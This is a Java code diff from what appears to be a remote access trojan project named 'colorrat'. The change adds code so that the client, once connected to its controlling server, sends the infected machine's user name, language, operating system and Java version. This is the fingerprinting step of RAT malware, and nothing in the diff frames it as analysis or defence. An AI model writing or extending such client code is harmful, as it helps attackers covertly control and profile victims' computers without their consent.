@@ -2,6 +2,7 @@ package eu.aragonapp.colorrat.network.thread.types;
 
 import eu.aragonapp.colorrat.ColorClient;
 import eu.aragonapp.colorrat.network.packet.Packet;
+import eu.aragonapp.colorrat.network.packet.types.client.C01PacketInformations;
 import eu.aragonapp.colorrat.network.thread.ColorThread;
 import eu.aragonapp.colorrat.utils.$;
 
@@ -32,6 +33,7 @@ public class ConnectThread extends ColorThread {
 
         ColorClient.getInstance().stop();
 
+
         if(connect()) {
             try {
                 ColorClient.getInstance().setOutputStream(new ObjectOutputStream(ColorClient.getInstance().getSocket().getOutputStream()));
@@ -44,7 +46,8 @@ public class ConnectThread extends ColorThread {
             ColorClient.getInstance().setReceiveThread(new ReceiveThread());
             ColorClient.getInstance().getReceiveThread().start();
 
-            //TODO("Send informations")
+            ColorClient.getInstance().write(new C01PacketInformations(System.getProperty("user.name"), System.getProperty("user.language"), System.getProperty("os.name"), System.getProperty("java.version")));
+            //ColorClient.getInstance().write(new C01PacketInformations());
         }
 
         try {
